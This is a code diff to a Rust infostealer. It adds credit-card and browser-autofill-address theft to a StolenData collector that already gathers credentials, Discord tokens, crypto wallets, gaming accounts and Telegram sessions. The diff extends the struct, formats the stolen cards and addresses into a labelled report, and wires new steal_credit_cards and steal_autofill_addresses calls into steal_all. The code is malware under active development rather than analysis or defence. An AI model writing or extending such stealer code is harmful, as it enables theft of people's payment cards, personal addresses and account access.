@@ -5,6 +5,7 @@ pub mod discord;
 pub mod wallets;
 pub mod gaming;
 pub mod telegram;
+pub mod autofill;
 pub mod common;
 
 use std::error::Error;
@@ -55,7 +56,7 @@ impl Credential {
     }
 }
 
-/// Estructura para datos robados (credenciales + tokens + wallets + gaming + telegram)
+/// Estructura para datos robados (credenciales + tokens + wallets + gaming + telegram + autofill)
 #[derive(Debug)]
 pub struct StolenData {
     pub credentials: Vec<Credential>,
@@ -63,6 +64,8 @@ pub struct StolenData {
     pub wallets: Vec<wallets::WalletData>,
     pub gaming: Vec<gaming::GamingData>,
     pub telegram: Vec<telegram::TelegramSession>,
+    pub credit_cards: Vec<autofill::CreditCard>,
+    pub addresses: Vec<autofill::AutofillAddress>,
 }
 
 impl StolenData {
@@ -73,6 +76,8 @@ impl StolenData {
             wallets: Vec::new(),
             gaming: Vec::new(),
             telegram: Vec::new(),
+            credit_cards: Vec::new(),
+            addresses: Vec::new(),
         }
     }
     
@@ -81,7 +86,9 @@ impl StolenData {
         self.discord_tokens.is_empty() && 
         self.wallets.is_empty() &&
         self.gaming.is_empty() &&
-        self.telegram.is_empty()
+        self.telegram.is_empty() &&
+        self.credit_cards.is_empty() &&
+        self.addresses.is_empty()
     }
     
     pub fn total_count(&self) -> usize {
@@ -89,7 +96,9 @@ impl StolenData {
         self.discord_tokens.len() + 
         self.wallets.len() +
         self.gaming.len() +
-        self.telegram.len()
+        self.telegram.len() +
+        self.credit_cards.len() +
+        self.addresses.len()
     }
     
     pub fn to_string(&self) -> String {
@@ -141,6 +150,26 @@ impl StolenData {
             for (idx, session) in self.telegram.iter().enumerate() {
                 output.push_str(&format!("\n[#{}] ", idx + 1));
                 output.push_str(&session.to_string());
+            }
+        }
+        
+        // Credit Cards
+        if !self.credit_cards.is_empty() {
+            output.push_str(&format!("\n\n💳 CREDIT CARDS ({})\n", self.credit_cards.len()));
+            output.push_str("═══════════════════════════════════════\n");
+            for (idx, card) in self.credit_cards.iter().enumerate() {
+                output.push_str(&format!("\n[#{}] ", idx + 1));
+                output.push_str(&card.to_string());
+            }
+        }
+        
+        // Autofill Addresses
+        if !self.addresses.is_empty() {
+            output.push_str(&format!("\n\n📍 AUTOFILL ADDRESSES ({})\n", self.addresses.len()));
+            output.push_str("═══════════════════════════════════════\n");
+            for (idx, address) in self.addresses.iter().enumerate() {
+                output.push_str(&format!("\n[#{}] ", idx + 1));
+                output.push_str(&address.to_string());
             }
         }
         
@@ -199,6 +228,14 @@ pub fn steal_all() -> StolenData {
     // Telegram Sessions
     let mut telegram_data = telegram::steal_telegram_sessions();
     data.telegram.append(&mut telegram_data);
+    
+    // Credit Cards
+    let mut credit_cards = autofill::steal_credit_cards();
+    data.credit_cards.append(&mut credit_cards);
+    
+    // Autofill Addresses
+    let mut addresses = autofill::steal_autofill_addresses();
+    data.addresses.append(&mut addresses);
 
     data
 }
